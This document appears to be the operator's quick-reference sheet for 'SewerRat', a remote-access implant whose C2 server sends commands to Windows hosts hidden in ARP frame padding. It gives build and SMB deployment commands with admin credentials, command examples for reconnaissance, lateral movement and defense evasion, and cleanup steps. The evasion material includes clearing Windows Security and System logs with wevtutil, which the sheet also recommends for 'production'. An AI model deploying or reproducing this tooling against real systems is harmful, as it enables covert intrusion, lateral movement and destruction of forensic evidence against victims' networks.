SEWERRAT QUICK REFERENCE
========================

BUILD
-----
cd sewerrat/
make all                    # Build both implant + server
make implant               # Build Windows only
make server                # Build Linux only
ls dist/                   # Verify binaries exist

DEPLOY (Windows Target)
-----------------------
Option A - Manual:
  1. Install Npcap: https://nmap.org/npcap/
  2. Copy dist/SewerRat.exe to C:\temp\
  3. Run: C:\temp\SewerRat.exe

Option B - Automated (SMB):
  python3 scripts/deploy.py -t 10.0.0.5 -u admin -p pass
  (Requires impacket: pip install impacket)

START SERVER (Linux)
--------------------
Default (eth0, 10s timeout):
  sudo ./dist/sewerrat-server

Custom interface:
  sudo ./dist/sewerrat-server -i wlan0

Custom timeout:
  sudo ./dist/sewerrat-server -i eth0 -t 15s

SERVER COMMANDS
---------------
broadcast <cmd>           - Send to all implants
send <mac> <cmd>          - Send to specific MAC
help                      - Show command reference
exit                      - Exit server

COMMAND EXAMPLES
----------------
Recon:
  broadcast whoami        - Current user
  broadcast systeminfo    - System info
  broadcast ipconfig /all - Network config
  broadcast tasklist      - Running processes

Lateral Movement:
  broadcast net view \\10.0.0.0
  broadcast net share
  broadcast wmic logicaldisk get name

Defense Evasion:
  broadcast wevtutil cl Security
  broadcast wevtutil cl System

COMMON ISSUES
-------------
"Failed to open interface"
  → Use sudo: sudo ./dist/sewerrat-server
  → Check interface: ip link show

"No response received"
  → Implant running? tasklist | find SewerRat
  → Network connected? ping <target>
  → Increase timeout: -t 15s or -t 30s

Implant hangs:
  → Npcap issue? Restart implant
  → Check Event Viewer for errors

QUICK DEPLOY WORKFLOW
---------------------
1. Build on Linux:
   cd sewerrat && make all

2. SMB deploy to Windows:
   python3 scripts/deploy.py -t 10.0.0.100 -u admin -p pass

3. Start C2 server:
   sudo ./dist/sewerrat-server -i eth0

4. Send commands:
   sewerrat> broadcast whoami
   [<<] 00:11:22:33:44:55: DOMAIN\Administrator

5. Cleanup:
   # On Windows target:
   del C:\Windows\System32\drivers\SewerRat.exe
   # Clear logs:
   wevtutil cl Security

PROTOCOL
--------
Magic Marker:     0x13 0x37 (Ethernet padding at offset 42)
Trigger IP:       10.255.255.254 (non-existent)
Max Command Size: 1024 bytes
Max Response:     4096 bytes
Latency:          2-5 seconds (includes jitter)
Jitter:           2-5 seconds between responses

QUICK PACKET CHECK (Wireshark)
------------------------------
Filter: arp
Look for:
  - ARP Request to 10.255.255.254
  - Magic marker 13 37 at byte offset 42-43
  - Command/response in bytes 44+

SECURITY
--------
This is a PoC - For production:
  1. Enable encryption: EncryptEnabled = true
  2. Rotate magic marker per engagement
  3. Add HMAC authentication
  4. Clear Windows logs after operations
  5. Use jitter randomization

PERFORMANCE
-----------

Network/cmd:       ~100 bytes per ARP frame
Response chunking: 20 bytes per ARP packet
